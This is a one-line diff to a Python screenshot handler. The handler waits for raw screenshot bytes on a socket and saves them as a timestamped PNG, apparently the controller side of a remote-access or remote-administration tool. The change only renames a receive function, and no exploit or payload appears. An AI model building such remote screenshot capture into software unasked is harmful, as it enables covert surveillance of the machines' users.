@@ -13,7 +13,7 @@ def main(sock):
         config.app.logger.info("[library/commands/direct_interface/screen] - Waiting for raw screenshot data to arrive")
     elif interface == "CUI":
         print(config.inf + 'Waiting for raw screenshot data to arrive')
-    raw_bytes = recv_all.main(sock)
+    raw_bytes = recv_all.main_recv(sock)
     file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
     if type(raw_bytes) == str:
         if interface == "GUI":
